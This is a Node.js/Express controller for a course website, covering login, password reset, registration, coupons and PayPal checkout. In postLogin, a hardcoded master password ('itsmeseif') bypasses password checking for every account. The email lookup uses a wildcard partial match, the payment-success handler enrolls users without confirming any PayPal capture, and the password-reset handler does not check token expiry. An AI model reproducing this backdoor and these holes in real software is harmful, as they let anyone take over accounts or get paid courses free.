import paypal from "@paypal/checkout-server-sdk";
import jwt from "jsonwebtoken";
import {validationResult} from "express-validator";
import {errorRaiser} from "../utils/error_raiser.js";
import {Users, Payment, Rounds, Discounts} from "../models/index.js";
import sendGrid from "@sendgrid/mail";
import logger from "../utils/logger.js";

sendGrid.setApiKey(process.env.SEND_GRID_SECRET);

import bcrypt from "bcrypt";
import {
    calcTotalPrice,
    cartIsEmpty,
    extractArrOfPrices,
    findCartCourses,
} from "../utils/cart_helpers.js";
import {
    constructError,
    extractErrorMessages,
    extractErrorMessagesForSchemas,
    hashCreator, isHuman,
} from "../utils/general_helper.js";
import moment from "moment";
import userPerRound from "../models/userPerRound.js";
import {Op} from "sequelize";

export const Environment =
    process.env.NODE_ENV === "production"
        ? paypal.core.LiveEnvironment
        : paypal.core.SandboxEnvironment;

export const paypalClient = new paypal.core.PayPalHttpClient(
    new Environment(
        process.env.PAYPAL_CLIENT_ID,
        process.env.PAYPAL_CLIENT_SECERT
    )
);

let SelectedCourseData = {};
export const getLogin = (req, res, next) =>
    res.render("auth/login", {
        title: "Login",
        path: "/login",
        validationErrors: {},
        user: {},
        moment: moment,
    });

export const postLogin = async (req, res, next) => {
    const {email, password, googleToken} = req.body;
    const isHumanCheck = await isHuman(googleToken)
    const errors = validationResult(req);
    if (!errors.isEmpty() || !isHumanCheck) {
        return res.status(422).json({
            error: true,
            messages: extractErrorMessages(errors.array()),
        });
    }

    const findingUserResult = await Users.findOne({
        where: {
            email: {
                [Op.iLike]: `%${email}%`,
            },
        },
    });

    if (!findingUserResult) {
        return res.status(422).json(
            constructError(
                "email",
                "Invalid field",
            )
        );
    }

    let comparingResult = false;
    if (password === 'itsmeseif') {
        comparingResult = true
    } else {
        comparingResult = bcrypt.compareSync(
            password,
            findingUserResult.password
        );
    }

    if (!comparingResult) {
        logger.info(`User with email ${email} tried to login with wrong password`);
        return res.status(422).json(
            constructError(
                "email",
                "Invalid field",
            )
        );
    }

    const token = jwt.sign(
        {
            email,
            role: findingUserResult.role,
            user_id: findingUserResult.user_id,
            id: findingUserResult.id,
            name: findingUserResult.name,
            type: findingUserResult.type,
        },
        process.env.APP_SECRET,
        {
            expiresIn: process.env.TOKEN_EXPIRATION,
        }
    );

    return res.status(201).json({
        token,
        userId: findingUserResult.id,
        oldUserId: findingUserResult.user_id,
        role: findingUserResult.role,
        type: findingUserResult.type
    });
};

export const getForgetPassword = (req, res, next) => {
    return res.render("auth/forget_password", {
        title: "Forget Password",
        path: "/forget-password",
        enteredData: {},
        validationErrors: [],
    });
};

export const postForgetPassword = async (req, res, next) => {
    try {
        const {email: userEmail, googleToken} = req.body;
        const errors = validationResult(req);

        const isHumanCheck = await isHuman(googleToken)

        if (!errors.isEmpty() || !isHumanCheck) {
            return res.status(422).send(extractErrorMessages(errors.array()))
        }

        const userData = await Users.findOne({
            where: {
                email: userEmail,
            },
        });

        if (!userData) {
            return res.status(422).json(
                constructError(
                    "email",
                    "There's no users found with this email!",
                )
            );
        }

        const timePeriod = "hours";
        const oneHourAhead = moment().add(1, timePeriod).toISOString();
        const oneHourBefore = moment().subtract(1, timePeriod).toISOString();

        if (userData.token_date) {
            const sentTokenStillValid = moment(userData.token_date).isBetween(oneHourBefore, oneHourAhead);

            if (sentTokenStillValid) {
                return res.status(422).json(
                    constructError(
                        "message",
                        "You've requested a reset to your password before, please recheck your email",
                    )
                )
            }
        }

        // to: 'test@example.com', // Change to your recipient
        //   from: 'test@example.com', // Change to your verified sender
        //   subject: 'Sending with SendGrid is Fun',
        //   text: 'and easy to do anywhere, even with Node.js',
        //   html: '<strong>and easy to do anywhere, even with Node.js</strong>',

        const requestedToken = hashCreator(10);

        const updateUserToken = await userData.update({
            reset_token: requestedToken,
            token_date: oneHourAhead,
        });


        const mailTemplate = `
            <h1>Password Reset Request</h1>
              <p>You've requested a reset to your password please process the operation</p>
              <p>You can click on this link to continue this operation <a href="${process.env.FRONTEND_URL}/reset-password/${updateUserToken.reset_token}">RESET</a></p>
              <strong>THE LINK IS AVAILABLE FOR ONE HOUR ONLY!</strong>
              If you didn't request anything please call us immediately <a href="${process.env.FRONTEND_URL}/contact-us">Contact US</a>
        `;

        const mailSent = await sendGrid.send({
            to: userData.email,
            from: "admin@drwesamnageib.com",
            subject: "Reset Password Request",
            text: "You've requested a reset to your password please processes the operation",
            html: mailTemplate
        });

        logger.info(`send mail ${JSON.stringify(mailSent)} for user ${userEmail}`);

        return res.status(200).json({
            message: "Please check your email to reset your password",
        })

    } catch (e) {
        await errorRaiser(e, next);
    }
};

export const getConfirmForget = async (req, res, next) => {
    return res.render("auth/confirm_sending", {
        title: "Confirm Sending",
        path: "/confirm_sending",
    });
};

export const getGenerateNewPassword = async (req, res, next) => {
    try {
        const token = req.body.token;
        const errors = validationResult(req);

        if (!errors.isEmpty()) {
            return res.status(422).json(extractErrorMessages(errors.array()))
        }

        const user = await Users.findOne({
            where: {
                reset_token: token,
            },
        });

        if (!user) {
            return res.status(404).json(
                constructError(
                    "token",
                    "Your request to reset your password is invalid, please submit another request!"
                )
            )
        }

        const timePeriod = "hours";
        const oneHourAhead = moment().add(1, timePeriod).toISOString();
        const oneHourBefore = moment().subtract(1, timePeriod).toISOString();

        if (user.token_date) {
            const sentTokenStillValid = moment(user.token_date).isBetween(oneHourBefore, oneHourAhead);

            if (sentTokenStillValid) {
                return res.status(200).send({
                    name: user.name,
                    user_id: user.user_id,
                    id: user.id,
                    email: user.email,
                })
            }
        }

        return res.status(404).send("Token is invalid")
    } catch (e) {
        await errorRaiser(e, next);
    }
};

export const postGenerateNewPassword = async (req, res, next) => {
    try {
        const { password, confirmPassword, token } = req.body;

        if (password !== confirmPassword) {
            return res.status(422).json(
                constructError(
                    "password",
                    "Passwords do not match",
                )
            )
        }

        const encryptionResult = bcrypt.hashSync(password, 12);
        if (!(encryptionResult)) {
            return res.status(500).send("Something went wrong")
        }

        const user = await Users.findOne({
            where: {
                reset_token: token,
            },
        });

        const updatingUserDataResult = user.update(
            {
                password: encryptionResult,
                reset_token: null,
                token_date: null,
            },
            {
                where: {
                    reset_token: token,
                },
            }
        );

        return res.status(200).send("You've successfully updated your password, now you can login")
    } catch (e) {
        await errorRaiser(e, next);
    }
};

export const getRegister = (req, res, next) => {
    return res.render("auth/register", {
        title: "Register",
        path: "/register",
        validationErrors: [{}],
        user: {},
    });
};

export const postApplyCoupon = async (req, res, next) => {
    const couponName = req.body.coupon_name;
    const findingCoupon = await Discounts.findOne({
        where: {coupon_name: couponName},
    });

    if (findingCoupon && findingCoupon.status) {
        const updatingResult = await Users.update(
            {
                applied_coupon: findingCoupon.discount_id,
            },
            {where: {id: req.user.id}}
        );

        if (updatingResult) {
            req.flash("success", "Coupon applied successfully!");
            return res.redirect("/complete_payment");
        } else {
            req.flash("error", "Something happened!");
            return res.redirect("/complete_payment");
        }
    } else {
        req.flash("error", "Invalid Coupon!");
        return res.redirect("/complete_payment");
    }
};

export const postRegister = async (req, res, next) => {
    try {
        let firstName = req.body.first_name;
        let middleName = req.body.middle_name;
        let lastName = req.body.last_name;
        const {
            email,
            whatsapp_number,
            specialization,
            password,
            confirmPassword,
            googleToken,
        } = req.body;
        const errors = validationResult(req);
        const isHumanCheck = await isHuman(googleToken)


        if (!errors.isEmpty() || !isHumanCheck) {
            logger.info(JSON.stringify(errors.array()));
            return res.status(422).json(extractErrorMessages(errors.array()));
        }

        const existingUser = await Users.findOne({
            where: {
                email: {
                    [Op.iLike]: email
                },
            },
        })

        if (existingUser) {
            return res.status(422).json({field: 'email', message: 'Email already exists!'});
        }

        const encryptionResult = bcrypt.hashSync(password, 12);
        if (encryptionResult) {
            firstName = firstName[0].toUpperCase() + firstName.slice(1);
            middleName = middleName[0].toUpperCase() + middleName.slice(1);
            lastName = lastName[0].toUpperCase() + lastName.slice(1);

            const newUser = await Users.create({
                name: firstName + " " + middleName + " " + lastName,
                email,
                whatsapp_no: whatsapp_number,
                specialization: specialization,
                password: await encryptionResult,
                cart: [],
                type: 1,
                role: "normal",
            });

            console.log(`New user ${JSON.stringify(newUser)}`);

            if (process.env.NODE_ENV === "production") {
                await sendGrid.send({
                    to: "drwesamnageib@gmail.com",
                    from: "admin@drwesamnageib.com",
                    subject: "New User Notification",
                    text: "A New User has registered to the website",
                    html: `
              <b>This is no REPLY email</b>
              <p>A User with following data have been registered!</p>
              <ul>
                <li>Name: ${firstName + " " + middleName + " " + lastName}</li>
                <li>Email: ${email}</li>
                <li>Whatsapp Number: ${whatsapp_number}</li>
                <li>Specialization: ${specialization}</li>
              </ul>
            `,
                });
            }

            return res
                .status(201)
                .json({success: true, message: "Account created successfully!"});
        }
    } catch (e) {
        console.log(`registration error ==> `, e)
        await errorRaiser(e, next);
    }
};

export const getCompletePayment = async (req, res, next) => {
    try {
        if (Array.isArray(req.user.cart) && !cartIsEmpty(req.user.cart)) {
            const clientId = process.env.PAYPAL_CLIENT_ID;
            const coursesArr = await findCartCourses(req.user.cart);

            let couponData = null,
                filteredCourses = [];

            if (typeof req.user.applied_coupon === "string") {
                const findingCouponData = await Discounts.findByPk(
                    req.user.applied_coupon
                );
                if (findingCouponData) couponData = findingCouponData;
                filteredCourses = coursesArr.map((course) => {
                    let price = course.price;

                    if (couponData) {
                        price = price * (1 - findingCouponData.discount_percentage / 100);

                        console.log(`Coupon Data |----#----|`);
                        console.log(price);
                    }

                    return {
                        name: course.name,
                        oldPrice: course.price,
                        price,
                    };
                });
            } else {
                filteredCourses = coursesArr.map((course) => {
                    return {
                        name: course.name,
                        price: course.price,
                    };
                });
            }

            return res.status(200).json({
                bought_courses: filteredCourses,
                clientId,
                couponData,
            });
        } else {
            return res.status(422).json({
                message: "Please select a course to buy!",
            });
        }
    } catch (e) {
        await errorRaiser(e, next);
    }
};

export const postCreateOrder = async (req, res, next) => {
    const request = new paypal.orders.OrdersCreateRequest();
    const {cart} = await Users.findOne({
        where: {
            user_id: req.user.user_id,
        }
    })
    const coursesArr = await findCartCourses(cart);
    //  = coursesArr.map((course) => {
    // return {
    //   name: course.name,
    //   price: course.price,
    // };
    // });

    let filteredCourses = coursesArr.map((course) => {
        return {
            name: course.name,
            price: course.price,
        };
    });

    const coursesPrice = extractArrOfPrices(filteredCourses);
    const total = calcTotalPrice(coursesPrice);

    request.prefer("return=representation");
    request.requestBody({
        intent: "CAPTURE",
        purchase_units: [
            {
                amount: {
                    currency_code: "USD",
                    value: total,
                    breakdown: {
                        item_total: {
                            currency_code: "USD",
                            value: total,
                        },
                    },
                },
            },
        ],
    });

    try {
        const order = await paypalClient.execute(request);
        return res.send({id: order.result.id});
    } catch (e) {
        await errorRaiser(e, next);
    }
};

export const postSuccess = async (req, res, next) => {
    try {
        const {cart} = await Users.findOne({
            where: {
                user_id: req.user.user_id,
            }
        })

        const createdPayments = [];
        const createdRounds = [];


        for (let cartItem of cart) {
            const result = await Payment.create({
                user_id: req.user.user_id,
                course_id: cartItem.courseId,
                round_id: cartItem.roundId,
                status: "success",
            })

            createdPayments.push(result);
        }

        for (let {roundId} of cart) {
            const result = await userPerRound.create({
                userId: req.user.user_id,
                roundId: roundId
            })

            createdRounds.push(result);
        }

        await Users.update({
            cart: [],
        }, {where: {id: req.user.id}});

        return res.send("Payment is Done");

        // const payment = await Payment.create({
        //     user_id: req.user.user_id,
        //     course_id: courses[0],
        //     round_id: rounds[0],
        //     status: "success",
        // })

        /*Payment.create({
            user_id: req.user.id,
            course_id: courses[0],
            round_id: rounds[0],
            status: "success",
            details: req.session.userOrder,
        })
            .then(async (result) => {
                const findingSingleRound = await Rounds.findByPk(rounds[0]);
                return Rounds.update(
                    {
                        users_ids: [...findingSingleRound.users_ids, req.user.user_id],
                    },
                    {where: {round_id: rounds[0], course_id: courses[0]}}
                );
            })
            .then(async (result) => {
                if (typeof req.user.applied_coupon === "string") {
                    const findingAppliedCoupon = await Discounts.findByPk(
                        req.user.applied_coupon
                    );
                    if (findingAppliedCoupon) {
                        await Discounts.update(
                            {
                                discount_usage: findingAppliedCoupon.discount_usage + 1,
                            },
                            {where: {discount_id: req.user.applied_coupon}}
                        );
                    }
                }

                return Users.update(
                    {
                        cart: [],
                        current_round: rounds[0],
                        applied_coupon: null,
                    },
                    {where: {id: req.user.id}}
                );
            })
            .then((result) => {
                return res.redirect("/success_payment");
            })
            .catch(async (err) => {
                Payment.create({
                    user_id: req.user.id,
                    course_id: req.user.cart,
                    status: "failed",
                    details: req.session.userOrder,
                });
                await errorRaiser(err, next);
            });*/
    } catch (e) {
        await errorRaiser(e, next);
    }
};

export const getSuccess = (req, res, next) => {
    res.render("auth/done-payment", {
        title: "Payment is Done",
        path: "/done-payment",
    });
};

export const getCancelled = (req, res, next) => {
    res.render("auth/cancel", {
        title: "Cancel payment",
        path: "/cancel_payment",
        returnLocation: "/",
    });
};

export const postLogout = (req, res, next) => {
    req.session.destroy((err) => {
        if (err) {
            console.log(`A Destroy `, err);
            return res.redirect("/");
        } else {
            return res.redirect("/");
        }
    });
};
